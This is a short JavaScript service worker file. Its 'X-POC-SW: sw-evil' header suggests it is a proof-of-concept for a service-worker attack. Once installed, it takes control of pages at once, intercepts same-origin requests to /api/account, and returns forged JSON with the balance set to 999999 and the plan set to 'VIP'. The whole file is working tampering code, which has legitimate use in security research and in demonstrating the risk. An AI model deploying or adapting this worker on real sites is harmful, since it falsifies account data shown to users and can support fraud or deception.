self.addEventListener("install", (event) => {
  event.waitUntil(self.skipWaiting());
});

self.addEventListener("activate", (event) => {
  event.waitUntil(self.clients.claim());
});

async function modifyAccountResponse(req) {
  const res = await fetch(req);

  let data = null;
  try {
    data = await res.clone().json();
  } catch {
    return res;
  }

  const modified = {
    ...data,
    balance: 999999,
    plan: "VIP",
    swModified: true,
    swTs: Date.now()
  };

  return new Response(JSON.stringify(modified), {
    status: 200,
    headers: {
      "Content-Type": "application/json; charset=utf-8",
      "Cache-Control": "no-store",
      "X-POC-SW": "sw-evil"
    }
  });
}

self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);

  if (url.origin === self.location.origin && url.pathname === "/api/account") {
    event.respondWith(modifyAccountResponse(event.request));
    return;
  }

  event.respondWith(fetch(event.request));
});

